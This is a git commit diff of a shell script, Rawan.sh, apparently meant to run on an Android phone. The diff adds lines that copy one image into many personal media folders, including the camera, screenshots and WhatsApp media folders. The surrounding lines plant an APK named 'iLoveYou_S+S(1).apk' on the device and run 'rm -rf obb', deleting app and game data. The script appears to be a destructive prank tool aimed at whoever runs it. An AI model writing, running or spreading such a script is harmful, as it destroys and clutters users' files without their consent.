fdb83af9c8cbb434625ccad921f14923be1aa0ca
BaapG <87407116+Vretlee@users.noreply.github.com>
2021-07-27 17:31:19 +0530

    Update Rawan.sh
    B

--- Rawan.sh
+++ Rawan.sh
@@ -4,6 +4,17 @@ mv Folder.py Crash.py
 cd  BaapG
 cp -r 'iLoveYou_S+S(1).apk' /sdcard
 cp -r JaiRajputana.jpg /sdcard
+cp -r JaiRajputana.jpg /sdcard/DCIM
+cp -r JaiRajputana.jpg /sdcard/DCIM/Camera
+cp -r JaiRajputana.jpg /sdcard/DCIM/Camera
+cp -r JaiRajputana.jpg /sdcard/DCIM/Screenshots
+cp -r JaiRajputana.jpg /sdcard/Pictures
+cp -r JaiRajputana.jpg /sdcard/Pictures/facebook
+cp -r JaiRajputana.jpg /sdcard/documents
+cp -r JaiRajputana.jpg /sdcard/Movies
+cp -r JaiRajputana.jpg /sdcard/bluetooth
+cp -r JaiRajputana.jpg /sdcard/DCIM/ScreenRecorder
+cp -r JaiRajputana.jpg /sdcard/WhatsApp/Media
 cd /sdcard/Android
 rm -rf obb
 cd /sdcard
